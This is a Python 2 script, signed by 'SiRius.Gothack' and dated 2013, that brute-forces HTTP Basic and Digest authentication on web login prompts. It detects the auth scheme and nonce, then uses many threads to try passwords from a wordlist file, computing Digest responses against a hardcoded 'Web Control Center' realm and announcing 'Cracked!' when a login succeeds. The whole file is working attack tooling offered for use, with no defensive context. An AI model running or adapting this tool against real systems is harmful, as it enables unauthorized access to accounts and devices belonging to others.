#-*-coding:utf-8-*-
'''
by SiRius.Gothack(gothack.329@gmail.com) 2013-03-15
'''
from urllib2 import Request, urlopen, URLError, HTTPError  
import urllib
from md5 import *
from random import *
import os
import Queue
import threading,time
 
global url
global uname
global auth_method
global queue
 
def request(url):
 
	#req = Request(url)
	try:
		resp = urlopen(url)
		code = resp.code	
	except HTTPError,e:
		code = e.code
		#print 'Error code: ',code
		if 'Digest' in str(e.info()):
			#print 'Digest'
			nonce=str(e.info()).split('nonce="')[1].split('"')[0]
			#print nonce
			return nonce
		elif 'Basic' in str(e.info()):
			return 'Basic'
			
def Basic(url,username,password):
	username = username.strip()
	password = password.strip()
	url = url 
	token = username+':'+password
	headers={'Authorization':'Basic '+token.encode('base64').strip()}	
	req = Request(url,None,headers)
	try:
		resp = urlopen(req)
		code = resp.code
	except HTTPError,e:
		code = e.code
	#print code
	if code == 200:
		print 'Cracked!Basic Password is : ',password
		os._exit(1)
	elif password == '':
		print 'Password not found!'
		os._exit(1)
 
 
def Digest(url,username,password):
	'''digest'''
	nonce = request(url)
	realm = 'Web Control Center'
	username = username.strip()
	password = password.strip()
	method = 'GET'
	uri = '/'
	A1 = username+':'+realm+':'+password
	HA1 = md5(A1).hexdigest()
	A2 = method+':'+uri
	HA2 = md5(A2).hexdigest()
	nc = '00000001'
	cnonce = md5(str(random())).hexdigest()
	qop = 'auth'
	response = md5(HA1+":"+nonce+":"+nc+":"+cnonce+":"+qop+":"+HA2).hexdigest()
	'''digest finish'''
	
	headers = {'Authorization':'Digest username="'+username+'",realm="'+realm+'",nonce="'+nonce+'",uri="'+uri+'",response="'+response+'",qop="'+qop+'",nc="'+nc+'",cnonce="'+cnonce+'"'}
	req = Request(url,None,headers)
	try:
		resp = urlopen(req)
		code = resp.code
	except HTTPError,e:
		code = e.code
		#nonce = str(e.info()).split('nonce="')[1].split('"')[0]
		#print code
		#return code
	if code == 200:
		print 'Cracked!Digest Password is : ',password
		os._exit(1)
	elif password == '':
		print 'Password not found!'
		os._exit(1)
 
class Producer(threading.Thread):
	def __init__(self,FILE):
		threading.Thread.__init__(self)
		self.FILE = FILE
	def run(self):
		pwdfile = open(self.FILE)
		while True:
			if queue.qsize() > 1000:
				pass
			else:
				pwd = pwdfile.readline().strip()
				queue.put(pwd)
				#print '+',pwd
 
	
class Basic_Consumer(threading.Thread):
	def __init__(self,url,uname):
		threading.Thread.__init__(self)
		self.url = url
		self.uname = uname
	def run(self):
		while True:
			if queue.qsize() < 10:
				#print queue.qsize()
				pass
			else:
				passwd = queue.get()
				Basic(self.url,self.uname,passwd)
				print '-',passwd
 
class Digest_Consumer(threading.Thread):
	def __init__(self,url,uname):
		threading.Thread.__init__(self)
		self.url = url
		self.uname = uname
	def run(self):
		while True:
			if queue.qsize() < 10:
				#print queue.qsize()
				pass
			else:
				passwd = queue.get()
				Digest(self.url,self.uname,passwd)
				#print '-',passwd
 
def main():
 
	FILE = 'password.txt'
	password = open(FILE)
	url = raw_input('Input the url(http://111.11.85.91:880): ')
	uname = raw_input('Input username: ')
	thread_count = int(raw_input('How many threads do you want to start: '))
	auth_method = request(url)
	
	p = Producer(FILE)
	p.start()
	time.sleep(1)
	
	if auth_method == 'Basic':
		print 'Auth method is Basic...'
		for i in range(thread_count):
			c = Basic_Consumer(url,uname)
			c.start()
		print c.name+' is started...'
	else:
		print 'Auth method is Digest...'
		for i in range(thread_count):
			c = Digest_Consumer(url,uname)
			c.start()
			print c.name+' is started...'
	
if __name__=='__main__':
	queue = Queue.Queue()
	main()
